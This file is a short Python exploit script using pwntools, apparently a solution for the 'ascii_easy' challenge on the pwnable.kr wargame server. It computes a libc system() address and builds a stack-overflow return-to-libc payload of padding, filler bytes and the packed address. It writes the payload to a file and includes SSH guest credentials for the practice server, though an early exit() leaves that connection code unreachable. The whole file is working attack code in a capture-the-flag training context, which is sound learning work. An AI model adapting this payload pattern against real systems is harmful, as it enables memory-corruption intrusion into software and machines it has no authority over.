#!/usr/bin/env python3

from pwn import *

# base of libc
BASE = 0x5555e000

# libc file read in during runtime
libc = ELF('libc-2.15.so')
libc.address = BASE

# get address to system
SYSTEM_ADDR = libc.symbols.system
SYSTEM_ADDR = 0x5559cf23

log.info(f'libc.symbols.system: {hex(SYSTEM_ADDR)}')

# create payload to rop to system
padding = 28
payload = flat(
    b'A' * padding,
    b'B' * 4,
    p32(SYSTEM_ADDR),
    )

# save payload to file
with open('payload', 'wb') as f:
    f.write(payload)

exit()

io = ssh(host='pwnable.kr', user='ascii_easy', password='guest', port=2222)
io.interactive()
io.exit()

